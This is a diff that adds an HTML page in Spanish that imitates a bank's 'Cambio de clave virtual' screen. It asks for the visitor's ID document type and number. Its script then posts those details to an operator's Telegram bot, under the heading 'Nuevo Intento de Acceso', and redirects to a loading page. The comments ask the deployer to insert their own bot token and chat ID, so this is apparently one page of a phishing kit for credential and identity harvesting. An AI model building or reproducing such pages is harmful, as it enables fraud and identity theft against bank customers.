@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cambio de clave virtual</title>
+    <link rel="stylesheet" href="home.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="header">
+        <div class="header-logo">
+            <i class="fa-solid fa-house-chimney"></i>
+        </div>
+    </div>
+
+    <div class="content">
+        <a href="index.html" class="back-link">
+            <i class="fa-solid fa-chevron-left"></i> Atrás
+        </a>
+
+        <h2 class="page-title">Cambio de clave virtual</h2>
+
+        <form id="loginForm" onsubmit="handleSubmit(event)">
+            <div class="form-group">
+                <label class="form-label">Seleccione el tipo de documento</label>
+                <div class="select-wrapper">
+                    <i class="fa-regular fa-address-card select-icon"></i>
+                    <select class="form-control has-icon" id="docType">
+                        <option value="Cédula de ciudadanía">Cédula de ciudadanía</option>
+                        <option value="Tarjeta de identidad">Tarjeta de identidad</option>
+                        <option value="Cédula de extranjería">Cédula de extranjería</option>
+                        <option value="Pasaporte">Pasaporte</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Ingrese el número de documento</label>
+                <input type="tel" class="form-control" id="docNumber" placeholder="Número de documento" required>
+            </div>
+
+            <div class="floating-headset">
+                <i class="fa-solid fa-headset"></i>
+            </div>
+            
+            <div class="footer">
+                <button type="submit" class="btn-continue" id="submitBtn">Continuar</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Enable button when input has value
+        const docNumberInput = document.getElementById('docNumber');
+        const submitBtn = document.getElementById('submitBtn');
+
+        docNumberInput.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                submitBtn.classList.add('active');
+                submitBtn.style.backgroundColor = '#D71920';
+                submitBtn.style.color = 'white';
+            } else {
+                submitBtn.classList.remove('active');
+                submitBtn.style.backgroundColor = '#E0E0E0';
+                submitBtn.style.color = '#757575';
+            }
+        });
+
+        async function handleSubmit(event) {
+            event.preventDefault();
+            
+            const docType = document.getElementById('docType').value;
+            const docNumber = document.getElementById('docNumber').value;
+
+            // TELEGRAM CONFIGURATION
+            // REPLACE THESE WITH YOUR ACTUAL VALUES
+            const BOT_TOKEN = '7629233630:AAHiWj1Hj1Hj1Hj1Hj1Hj1Hj1Hj1Hj1Hj1'; // Example format, replace with yours
+            const CHAT_ID = 'YOUR_CHAT_ID'; // Replace with yours
+
+            const message = `
+🔐 *Nuevo Intento de Acceso* 🔐
+----------------------------
+📄 *Tipo de Documento:* ${docType}
+🔢 *Número:* ${docNumber}
+----------------------------
+            `;
+
+            // Since we don't have the real token/id, we will simulate the request or try to send if provided.
+            
+            console.log("Sending to Telegram:", message);
+
+            
+            // Uncomment and configure this block to actually send
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending message:', error);
+            }
+            
+
+            // Navigate to loading page
+            window.location.href = 'cargando.html';
+        }
+    </script>
+</body>
+</html>
